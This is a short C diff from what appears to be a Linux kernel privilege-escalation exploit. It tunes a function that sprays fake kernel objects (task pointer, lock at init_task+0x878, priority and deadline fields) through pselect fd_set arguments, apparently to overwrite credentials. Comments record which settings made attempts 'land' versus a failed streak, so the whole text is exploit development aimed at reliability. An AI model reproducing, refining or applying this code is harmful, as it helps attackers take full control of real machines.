@@ -1061,7 +1061,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (active_offsets && active_offsets->off_bss_tail_lock
                        ? (uint64_t)active_offsets->off_bss_tail_lock
                        : 0x02BB9D00ULL));
-              stack_prio = 3;
+              /* prio MUST be 0 (Z33 stamp): the 08-24 writer hardcoded
+               * word8=0, so Z25-Z33 all walked prio=0 and Z33 landed.
+               * 93473c5 (08-29) started emitting stack_prio(3) — the
+               * entire 0/15 cold streak ran prio=3. */
+              stack_prio = 0;
               stack_deadline = 0;
               pr_info("stack SLIDE_CRED %s: *%016llx = %016llx (%s) "
                       "pc=%016llx r=%016llx l=%016llx\n",
@@ -1111,7 +1115,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                 pi_left = 0;
                 stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
                 stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
-                stack_prio = 3;
+                stack_prio = 0; /* Z33 stamp: word8 was hardcoded 0 on 08-24 */
                 stack_deadline = 0;
                 pr_info("stack mode4 LEAF-NULL *%016llx=0 parent=%016llx "
                         "lock=init_task+0x878 (not tree_pc=0)\n",
@@ -1128,7 +1132,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               pi_left = 0;
               stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
               stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
-              stack_prio = 3;
+              stack_prio = 0; /* Z33 stamp: word8 was hardcoded 0 on 08-24 */
               stack_deadline = 0;
               pr_info("stack mode4 SLIDE_ZERO PLAIN-STORE *state=%016llx "
                       "val=%016llx (enf=0 init≠0) lock=init_task+0x878\n",
